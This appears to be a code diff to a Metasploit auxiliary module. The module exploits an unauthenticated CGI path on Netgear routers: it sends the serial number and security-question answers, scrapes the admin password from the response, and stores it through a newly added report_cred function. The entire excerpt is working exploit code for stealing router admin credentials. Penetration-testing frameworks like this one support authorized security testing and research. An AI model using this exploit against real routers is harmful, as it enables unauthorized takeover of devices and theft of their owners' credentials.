@@ -96,31 +96,31 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     # 1: send serial number
-    res = send_request_cgi({
-        'uri'     => '/apply_noauth.cgi?/unauth.cgi',
-        'method'  => 'POST',
-        'Content-Type' => 'application/x-www-form-urlencoded',
-        'vars_post' =>
-        {
-          'submit_flag' => 'match_sn',
-          'serial_num'  => serial,
-          'continue'    => '+Continue+'
-        }
-      })
+    send_request_cgi({
+      'uri'     => '/apply_noauth.cgi?/unauth.cgi',
+      'method'  => 'POST',
+      'Content-Type' => 'application/x-www-form-urlencoded',
+      'vars_post' =>
+      {
+        'submit_flag' => 'match_sn',
+        'serial_num'  => serial,
+        'continue'    => '+Continue+'
+      }
+    })
 
     # 2: send answer to secret questions
-    res = send_request_cgi({
-        'uri'     => '/apply_noauth.cgi?/securityquestions.cgi',
-        'method'  => 'POST',
-        'Content-Type' => 'application/x-www-form-urlencoded',
-        'vars_post' =>
-        {
-          'submit_flag' => 'security_question',
-          'answer1'     => @q1,
-          'answer2'     => @q2,
-          'continue'    => '+Continue+'
-        }
-      })
+    send_request_cgi({
+      'uri'     => '/apply_noauth.cgi?/securityquestions.cgi',
+      'method'  => 'POST',
+      'Content-Type' => 'application/x-www-form-urlencoded',
+      'vars_post' =>
+      {
+        'submit_flag' => 'security_question',
+        'answer1'     => @q1,
+        'answer2'     => @q2,
+        'continue'    => '+Continue+'
+      }
+    })
 
     # 3: PROFIT!!!
     res = send_request_cgi({
@@ -130,7 +130,7 @@ class MetasploitModule < Msf::Auxiliary
 
     if res && res.body =~ /Admin Password: (.*)<\/TD>/
       password = $1
-      if password.nil? or password == ""
+      if password.blank?
         fail_with(Failure::Unknown, "#{peer} - Failed to obtain password! Perhaps security questions were already set?")
       end
     else
@@ -144,6 +144,33 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     return [username, password]
+  end
+  
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: 'netgear',
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      last_attempted_at: DateTime.now,
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   def send_req(timestamp)
@@ -211,6 +238,7 @@ class MetasploitModule < Msf::Auxiliary
         if res && res.code == 200
           credentials = get_creds
           print_good("#{peer} - Success! Got admin username \"#{credentials[0]}\" and password \"#{credentials[1]}\"")
+          report_cred({ 'user' => credentials[0], 'password' => credentials[1] })
           return
         end
       end
